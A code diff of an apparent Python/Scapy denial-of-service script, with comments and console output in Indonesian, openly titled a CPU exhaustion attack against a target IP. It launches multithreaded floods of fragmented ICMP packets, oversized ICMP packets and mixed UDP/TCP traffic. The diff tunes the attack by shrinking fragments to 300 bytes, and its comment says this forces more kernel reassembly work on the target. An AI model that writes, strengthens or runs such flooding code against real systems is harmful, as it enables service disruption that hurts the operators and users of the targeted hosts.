@@ -14,15 +14,20 @@ NUM_MIXED_FLOOD_THREADS = 10    # Thread untuk mixed UDP/TCP flood
 
 PACKETS_PER_BATCH = 30  # Batch lebih kecil karena paket lebih kompleks
 FRAGMENTATION_PAYLOAD_SIZE = 8000  # Bytes - memaksa fragmentasi dan reassembly
+FRAGMENT_SIZE = 300                # Bytes - fragment kecil untuk memaksa lebih banyak reassembly
 LARGE_ICMP_PAYLOAD_SIZE = 5000     # Bytes - payload besar untuk ICMP
 MIXED_PAYLOAD_SIZE = 1400          # Bytes - untuk UDP/TCP
+
+# Timing constants
+THREAD_START_DELAY = 0.1           # Detik - delay antar thread startup
+THREAD_SHUTDOWN_DELAY = 2          # Detik - waktu tunggu untuk thread berhenti
 
 print("=" * 70)
 print("--- SERANGAN CPU EXHAUSTION ---")
 print("=" * 70)
 print(f"Target: {target_ip}")
 print(f"\nKonfigurasi Thread:")
-print(f"  - Thread Fragmentasi: {NUM_FRAGMENTATION_THREADS} (paket 8000-byte)")
+print(f"  - Thread Fragmentasi: {NUM_FRAGMENTATION_THREADS} (paket 8000-byte, fragment {FRAGMENT_SIZE}-byte)")
 print(f"  - Thread ICMP Besar: {NUM_LARGE_ICMP_THREADS} (paket 5000-byte)")
 print(f"  - Thread Mixed UDP/TCP: {NUM_MIXED_FLOOD_THREADS} (port random)")
 print(f"  - TOTAL THREAD: {NUM_FRAGMENTATION_THREADS + NUM_LARGE_ICMP_THREADS + NUM_MIXED_FLOOD_THREADS}")
@@ -58,9 +63,9 @@ def fragmentation_attack_thread(thread_id):
                       ICMP() / \
                       Raw(load="X" * FRAGMENTATION_PAYLOAD_SIZE)
         
-        # Fragment paket dengan ukuran fragment 800 bytes
-        # Ini memaksa kernel untuk reassemble banyak fragment
-        fragments = fragment(large_packet, fragsize=800)
+        # Fragment paket dengan ukuran fragment kecil
+        # Fragment lebih kecil memaksa kernel melakukan lebih banyak operasi reassembly
+        fragments = fragment(large_packet, fragsize=FRAGMENT_SIZE)
         packets.extend(fragments)
     
     print(f"[FRAG Thread {thread_id}] Dimulai - Mengirim paket terfragmentasi")
@@ -145,21 +150,21 @@ try:
         thread = threading.Thread(target=fragmentation_attack_thread, args=(i,), daemon=True)
         thread.start()
         threads.append(thread)
-        time.sleep(0.1)  # Small delay between thread starts
+        time.sleep(THREAD_START_DELAY)
     
     # Start Large ICMP threads
     for i in range(NUM_LARGE_ICMP_THREADS):
         thread = threading.Thread(target=large_icmp_attack_thread, args=(i,), daemon=True)
         thread.start()
         threads.append(thread)
-        time.sleep(0.1)
+        time.sleep(THREAD_START_DELAY)
     
     # Start Mixed Flood threads
     for i in range(NUM_MIXED_FLOOD_THREADS):
         thread = threading.Thread(target=mixed_flood_attack_thread, args=(i,), daemon=True)
         thread.start()
         threads.append(thread)
-        time.sleep(0.1)
+        time.sleep(THREAD_START_DELAY)
     
     print("\n" + "=" * 70)
     print(f"SEMUA {len(threads)} THREAD AKTIF - SERANGAN CPU EXHAUSTION BERJALAN")
@@ -176,6 +181,6 @@ except KeyboardInterrupt:
     print("--- MENGHENTIKAN SERANGAN ---")
     print("=" * 70)
     stop_attack = True
-    time.sleep(2)  # Beri waktu thread untuk berhenti
+    time.sleep(THREAD_SHUTDOWN_DELAY)  # Beri waktu thread untuk berhenti
     print("\n--- Serangan dihentikan dengan sukses ---")
     print("=" * 70)
